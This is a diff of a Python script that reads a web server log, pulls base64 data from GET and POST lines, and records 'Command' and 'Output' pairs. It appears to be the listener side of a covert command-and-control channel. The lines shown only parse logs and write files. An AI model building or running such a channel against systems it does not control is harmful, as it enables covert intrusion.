@@ -33,13 +33,8 @@ Results = ""
 while True:
      
     with open('./ServerRequirements/log.txt', 'r') as f:
-        #info = f.readlines()
-        #print 'Readed: ' + str(info)
         lineList = f.readlines() # read lines
-        #lineList = info.readlines() 
-        #print "lineList is: " + str(lineList)
         lastLine = lineList[len(lineList)-1] # read last linei
-        #print "Last line is: " + lastLine # prints last line
             
         SearchStr = re.search(r'GET (.*?) HTTP', lastLine) # search for string between GET and HTTP.. which should be the base64
         SearchDL = re.search(r'POST (.*?) HTTP', lastLine)
@@ -63,8 +58,14 @@ while True:
             if Input != oldInput:
                 #print "Command: " + Input
                 #print "Output: " + Results
-                print("\033[1;32;40m " + "Command: " + Input + "\033[0;37;40m")
-                print("\033[1;32;40m " + "Output: " + Results + "\033[0;37;40m")
+                #print("\033[1;32;40m " + "Command: " + Input + "\033[0;37;40m")
+                #print("\033[1;32;40m " + "Output: " + Results + "\033[0;37;40m")
+
+                # Write to a temp file.. maybe this will work on commandserver?
+                e = open("./Logs/temp.txt", "w")
+                e.write("Command: " + Input + '\n')
+                e.write("Ouput: " + Results + '\n')
+                e.close()
 
                 # Save to Log
                 f = open("./Logs/" + LOG + "-log.txt", "a")
